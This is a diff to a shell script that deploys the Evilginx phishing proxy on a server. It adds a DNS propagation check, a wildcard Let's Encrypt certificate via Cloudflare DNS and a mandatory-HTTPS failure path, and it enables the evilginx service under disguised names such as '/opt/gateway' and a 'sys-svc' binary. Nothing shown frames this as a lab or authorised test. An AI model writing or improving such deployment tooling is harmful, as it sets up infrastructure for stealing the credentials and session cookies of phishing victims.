@@ -450,20 +450,37 @@ dns_cloudflare_api_token = $CF_TOKEN
 EOF
 chmod 600 /etc/letsencrypt/cloudflare.ini
 
+log "Verifying DNS A record propagation for $DOMAIN..."
+MAX_ATTEMPTS=30
+for ((i=1; i<=MAX_ATTEMPTS; i++)); do
+    CURRENT_IP=$(dig +short "$DOMAIN" @1.1.1.1 | tail -n1)
+    if [[ "$CURRENT_IP" == "$VPS_IP" ]]; then
+        log "DNS confirmed: $DOMAIN is pointing to $VPS_IP"
+        break
+    fi
+    if [[ $i -eq $MAX_ATTEMPTS ]]; then
+        warn "DNS for $DOMAIN is currently '$CURRENT_IP', expected '$VPS_IP'."
+        warn "Attempting certificate request anyway..."
+    else
+        echo -ne "  [i] Waiting for DNS to point to $VPS_IP... (Attempt $i/$MAX_ATTEMPTS)\r"
+        sleep 10
+    fi
+done
+echo ""
+
 log "Requesting wildcard certificate for *.$DOMAIN..."
 certbot certonly --dns-cloudflare \
     --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
-    --dns-cloudflare-propagation-seconds 90 \
+    --dns-cloudflare-propagation-seconds 120 \
     --non-interactive --agree-tos --email "admin@$DOMAIN" \
-    -d "$DOMAIN" -d "*.$DOMAIN" 2>/dev/null
+    -d "$DOMAIN" -d "*.$DOMAIN" || true
 
 if [[ -d "/etc/letsencrypt/live/$DOMAIN" ]]; then
     ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "/opt/gateway/certs/$DOMAIN.crt"
     ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "/opt/gateway/certs/$DOMAIN.key"
     log "SSL certificate installed successfully"
 else
-    warn "SSL failed - running in HTTP mode"
-    sed -i 's/https_port: 443/https_port: 0/' /opt/gateway/config/config.yaml
+    error "SSL certificate acquisition failed. Cannot proceed without HTTPS."
 fi
 
 # Create systemd service
@@ -489,6 +506,9 @@ EOF
 systemctl daemon-reload
 systemctl enable evilginx
 systemctl start evilginx
+
+# Create a symlink for the management command
+ln -sf /usr/local/bin/sys-svc /usr/local/bin/evilginx-cli
 
 log "Installation complete!"
 echo ""
